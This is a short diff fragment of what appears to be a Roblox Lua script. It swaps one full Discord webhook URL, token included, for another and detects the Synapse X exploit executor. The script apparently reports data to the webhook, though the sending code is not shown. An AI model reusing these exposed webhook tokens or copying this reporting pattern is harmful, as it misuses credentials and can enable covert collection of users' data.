@@ -7,7 +7,7 @@ break
 end
 end
 local hs=game:GetService("HttpService")
-local wh="https://discord.com/api/webhooks/1357522038830530643/d-fy4oTk6Pt-4JvoKo8bfkLaEzl3XQkjOajdH9bSUaIRLDl84MgJfTSBMUReV24UMfG_"
+local wh="https://discord.com/api/webhooks/1363978720410468515/pzO3alicvMtGr5Of8f1d5gMgbGAeqNLLurXQ_yN8Oir1wgXFAPPLUGXpf5berHh4tphp"
 local ex="Unknown"
 if syn then
 ex="Synapse X"
